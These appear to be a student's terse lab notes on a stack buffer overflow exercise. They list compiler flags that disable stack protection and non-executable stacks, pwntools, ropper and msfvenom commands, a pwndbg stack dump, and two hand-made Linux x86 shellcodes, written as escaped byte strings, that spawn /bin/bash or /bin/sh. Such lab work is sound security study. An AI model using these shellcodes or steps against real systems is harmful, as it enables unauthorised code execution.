
file vuln 

gcc vuln.c -o vuln -fstack-protector-all -

remove all protection
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

ltrace

checksec --file=vuln

/mnt/e/Desktop/cslab/Buffer overflow attack


export PATH=$PATH:~/.local/bin

export PYTHONPATH=$PYTHONPATH:/usr/local/lib/python3.10/dist-packages


cyclic 100


rdi , rsi , rsx , rcx

ropper --file vuln --search "pop rdi"    

ls -lart


shellcraft i386.linux.sh

shellcraft i386.linux.sh -f a

msfvenom -p linux/x86/exec PATH=














  #  gcc -c asm.s -o asm.o -m32
  #  objdump -d asm.o
  # ld -m elf_i386 -o asm asm.o -lc

  
# 00000000 <_start>:
#    0:   eb 18                   jmp    1a <line>

# 00000002 <address>:
#    2:   5e                      pop    %esi
#    3:   31 c0                   xor    %eax,%eax
#    5:   88 46 09                mov    %al,0x9(%esi)
#    8:   89 76 0a                mov    %esi,0xa(%esi)
#    b:   89 46 0e                mov    %eax,0xe(%esi)
#    e:   b0 0b                   mov    $0xb,%al
#   10:   89 f3                   mov    %esi,%ebx
#   12:   8d 4e 08                lea    0x8(%esi),%ecx
#   15:   8d 56 0c                lea    0xc(%esi),%edx
#   18:   cd 80                   int    $0x80

# 0000001a <line>:
#   1a:   e8 e3 ff ff ff          call   2 <address>

# 0000001f <variable>:
#   1f:   2f                      das
#   20:   62 69 6e                bound  %ebp,0x6e(%ecx)
#   23:   2f                      das
#   24:   62 61 73                bound  %esp,0x73(%ecx)
#   27:   68 41 42 42 42          push   $0x42424241
#   2c:   42                      inc    %edx
#   2d:   43                      inc    %ebx
#   2e:   43                      inc    %ebx
#   2f:   43                      inc    %ebx
#   30:   43                      inc    %ebx

# \xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43\x43



0x08049176




0x0804c040





pwndbg> x/32xw $esp
0xffffc8f0:     0xffffc900      0x0804c040      0xf7fc6700      0x08049185
0xffffc900:     0x895e1ceb      0xc0310876      0xb00c4689      0x8df3890b
0xffffc910:     0x568d084e      0x3180cd0c      0x40d889db      0xdfe880cd
0xffffc920:     0x2fffffff      0x2f6e6962      0x00006873      0x00000000
0xffffc930:     0x00000000      0x00000000      0xf7d93374      0x0804826c
0xffffc940:     0xf7d8a194      0xf7fbe66c      0xffffc9c4      0x003055e4
0xffffc950:     0xf7d994be      0xf7fd02a4      0xf7d86674      0xffffc9cc
0xffffc960:     0xf7ffdba0      0x00000002      0xf7fbeb10      0x00000001
pwndbg> cyclic  



\xeb\x1c\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"



0x08049186